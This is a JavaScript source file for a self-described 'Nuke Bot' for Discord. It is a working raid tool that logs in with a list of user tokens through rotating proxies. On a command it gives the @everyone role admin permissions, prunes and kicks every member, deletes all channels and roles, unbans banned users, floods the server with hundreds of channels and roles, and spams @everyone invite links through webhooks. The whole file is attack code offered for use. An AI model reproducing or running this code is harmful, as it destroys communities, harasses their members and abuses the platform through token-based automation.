const fs = require('fs')
const tokens = fs.readFileSync('./variables/tokens.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const proxies = fs.readFileSync('./variables/proxies.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const botconfig = require("./variables/botconfig.json");
const Discord = require("discord.js");
const request = require('request');
var chalk = require('chalk');
var time = new Date().toDateString() + ' ' + new Date().toLocaleTimeString();

const userid = botconfig.userid;
const prefix = botconfig.prefix;

process.on('unhandledRejection', e => {});
process.on('uncaughtException', e => {});
process.on('uncaughtRejection', e => {});
process.warn = () => {};

function write(content, file) {
    fs.appendFile(file, content, function(err) {});
}
function prune(token, guild) {
    request({
        method: "POST",
        url: `https://discord.com/api/v9/guilds/${guild}/prune`,
        json: true,
        headers: {
            "authorization": token,
            "Content-Type": "application/json",
        },
        body: {
            "compute_prune_count": false,
            "days": 1,
            "include_roles": ["744165933811105846"]
        }
    }, (err, res, body) => {
        switch (res.statusCode) {
            case 200:
                console.log(chalk.inverse.hex("00FF00")("[PRUNE] Started Kicking Members From Server!"));
                break;
            default:
                console.log(chalk.red("[PRUNE] Failed To Start! Will Keep Attempting until Successful!"));
                prune(token, guild);
                break;
        }
    })
}
function admin(token, guild, everyone) {
    request({
        method: "PATCH",
        url: `https://discord.com/api/v9/guilds/${guild}/roles/${everyone}`,
        json: true,
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        },
        json: {
            "color": 0,
            "hoist": false,
            "mentionable": false,
            "name": "@everyone",
            "permissions": "6546771529"
        }
    }, (err, res, body) => {
        console.log(chalk.inverse("[INFO] Everyone Role Has Now Been Given Admin"));
    })
}
async function webhookSpam(webhook) {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)]
	var sent = 0;
	for(i = 0; i < 3; i++){
		request({
			method: "POST",
			url: `https://discordapp.com/api/webhooks/${webhook.id}/${webhook.token}`,
			proxy: "http://" + proxy,
			json: true,
			headers: {
				"Content-Type": "application/json",
			},
			json: {
				"username": "Nuke Bot",
				"content": `@everyone https://discord.gg/x2rntxtBpF join KEK`,
				"avatar_url": "https://sm.mashable.com/mashable_sea/photo/default/man-fakes-death-cat-q6u_2z9w.png"
			}
		}, (err, res, body) => {
			switch (res.statusCode) {
				case 204:
					sent++;
					console.log(`[Webhook] Messages Sent on Webhook ${webhook.id} ${sent}`);
					break;
				default:
					webhookSpam(webhook)
					break;
			}
		})

	}
}
function banAll(token, guild, member) {
	request({
			method: "PUT",
			url: `https://discord.com/api/v9/guilds/${guild}/bans/${member}`,
			json: true,
			headers: {
				"Content-Type": "application/json",
				"authorization": token
			},
			json: {
				"delete_message_days":"1",
				"reason": ""
				}
		}, (err, res, body) => {
			switch (res.statusCode) {
				case 204:
					console.log(`[BANNED] ${member} Successfully!`);
					break;
				default:
					break;
			}
		})
}
function kickAll(token, guild, member) {
	request({
			method: "DELETE",
			url: `https://discord.com/api/v9/guilds/${guild}/members/${member}?reason=`,
			json: true,
			headers: {
				"Content-Type": "application/json",
				"authorization": token
			},
			json: {
				"reason": "L"
				}
		}, (err, res, body) => {
			switch (res.statusCode) {
				case 204:
					console.log(`[Kicked] ${member} Successfully! `);
					break;
				default:
					break;
			}
		})
}
function unbanAll(token, guild, member) {
	request({
			method: "DELETE",
			url: `https://discord.com/api/v9/guilds/${guild}/bans/${member}`,
			json: true,
			headers: {
				"Content-Type": "application/json",
				"authorization": token
			},
		}, (err, res, body) => {
			switch (res.statusCode) {
				case 204:
					console.log(`[UNBANNED] ${member} Successfully!`);
					break;
				default:
					break;
			}
		})
}

class bot {
    constructor(token) {
        this.token = token;
        this.bot = new Discord.Client();
        disableEveryone: true
    }
    start() {
        this.bot.on('ready', () => {
            process.title = `[313] Nuke Bot | Created by Luci | Bots ${tokens.length}`;
            console.log(chalk.hex("313CA1")(`[!] ${time}: Logged into User Token ${this.bot.user.tag}`));
        })
        this.bot.on("message", async message => {
            let messageArray = message.content.split(" ");
            let args = messageArray.slice(1);
            if (message.author.bot) return;

            if (message.content.startsWith(`${prefix}nuke`)) {
				const Members = message.guild.members.map(member => member.id);
                const guild = message.guild.id;
                const everyone = message.guild.defaultRole.id;

				message.guild.setName('Server Nuked').then(updated => console.log(`[GUILD] Updated guild name to ${updated.name}`));
                admin(this.token, guild, everyone);
                prune(this.token, guild);
				Members.forEach(member => kickAll(this.token, guild, member));
                message.guild.channels.forEach(channel => channel.delete())
                message.guild.roles.map(r => r.delete().catch(err => {}));

				message.guild.fetchBans().then(bans => { if (bans.size == 0) { return console.log("There are no banned users."); }
                    bans.forEach(ban => {
						unbanAll(this.token, guild, ban.id)
                    });
				})

                for (let i = 0; i < 250; i++) {
                    message.guild.createChannel("Nuked", { type: "text" }).then(channel => {
                      channel.createWebhook("God").then( webhook => {webhookSpam(webhook); })
                    })
                    message.guild.createChannel("Nuked", { type: "Voice" }).catch("");
                    message.guild.createRole({ name: `{"type":"error","title":"Nuking"}`, color: "RANDOM", permissions: []})
                }
                console.log(chalk.hex("66FF00")("[NUKE] Server has been nuked"));
            }
        });
        this.bot.login(this.token).catch(err => console.log(chalk.inverse.red(`${time} Error: Invalid Token!`)));
    }
}

console.log(chalk.hex("313CA1")(`
			███▄    █  █    ██  ██ ▄█▀ ▓█████      ▄▄▄▄    ▒█████  ▄▄▄█████▓
			██ ▀█   █  ██  ▓██▒ ██▄█▒  ▓█   ▀     ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒
			▓██  ▀█ ██▒▓██  ▒██░▓███▄░  ▒███       ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░
			▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄  ▒▓█  ▄     ▒██░█▀  ▒██   ██░░ ▓██▓ ░
			▒██░   ▓██░▒▒█████▓ ▒██▒ █▄▒░▒████    ▒░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░
			░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░░ ▒░     ░░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░
			░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░░ ░ ░      ░▒░▒   ░   ░ ▒ ▒░     ░
			░   ░ ░  ░░░ ░ ░ ░ ░░ ░     ░        ░    ░ ░ ░ ░ ▒    ░
					░    ░     ░  ░   ░   ░      ░ ░          ░ ░           `));
console.log("");
console.log(chalk.hex("CA1313")(`[*] Created by Luci! Join our Support Server ${chalk.white('discord.gg/Nhp3rkNT')}`));
console.log(chalk(`[*] Bot Prefix is set to: [${prefix}]`));
console.log("");
tokens.forEach(token => new bot(token).start());
